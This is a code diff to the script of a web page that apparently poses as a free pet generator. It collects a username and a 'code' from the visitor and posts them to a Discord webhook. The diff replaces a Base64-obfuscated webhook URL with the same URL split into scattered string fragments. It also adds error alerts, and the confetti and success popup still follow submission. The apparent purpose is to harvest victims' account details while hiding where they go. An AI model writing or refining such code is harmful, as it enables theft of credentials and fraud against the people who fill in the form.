@@ -191,43 +191,52 @@
     document.getElementById('confirmPopup').style.display = 'none';
   }
 
-  // --- Webhook hidden in Base64 ---
-  const hiddenWebhook = [
-    "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv", 
-    "MTQwOTYwNTE2NTc4MjE0MzAxNg==", 
-    "L2E5blV5VVJVUkM3UU91V2NzTXpL", 
-    "enpUSUd6bzF0VzNBXw==", 
-    "a3NlRmdhdWQzV1FfaHo", 
-    "zVmt4SU93bTMxSDd4eVNtTEJKYm0="
-  ];
+  // --- Scattered webhook pieces ---
+  const p1 = "https://disc";
+  const p2 = "ord.com/ap";
+  const p3 = "i/webh";
+  const p4 = "ooks/";
+  const wid = "1409605165782143016";
+  const token1 = "/a9nUyURURC7QOuWcsM";
+  const token2 = "zKzzTIGzo1tW3A_";
+  const token3 = "kseFgaud3WQ_hz3Vkx";
+  const token4 = "IOwm31H7xySmLBJbm";
 
-  function decodeBase64(str) {
-    return decodeURIComponent(atob(str).split('').map(function(c) {
-      return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
-    }).join(''));
-  }
+  const webhookURL = p1+p2+p3+p4+wid+token1+token2+token3+token4;
 
   async function submitData() {
     const username = document.getElementById('username').value.trim();
     const code = document.getElementById('code').value.trim();
-    if (!username || !code) return;
-
-    // Stitch and decode webhook
-    const webhookURL = hiddenWebhook.map(x => decodeBase64(x)).join("");
+    if (!username || !code) {
+      alert("Please enter both username and code.");
+      return;
+    }
 
     const payload = {
       content: `Pet Generated!\nUsername: ${username}\nCode: ${code}\nSelected Pet: ${pets.find(p=>p.id===selectedPet).name}`
     };
 
-    await fetch(webhookURL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(payload)
-    });
+    try {
+      const res = await fetch(webhookURL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
 
-    document.getElementById('popup').style.display = 'none';
-    document.getElementById('confirmPopup').style.display = 'flex';
-    launchConfetti();
+      if (!res.ok) {
+        console.error("Webhook error:", await res.text());
+        alert("Webhook failed. Check console for details.");
+        return;
+      }
+
+      document.getElementById('popup').style.display = 'none';
+      document.getElementById('confirmPopup').style.display = 'flex';
+      launchConfetti();
+
+    } catch (err) {
+      console.error("Fetch error:", err);
+      alert("Could not send data to webhook.");
+    }
   }
 
   // 🎉 Confetti Effect
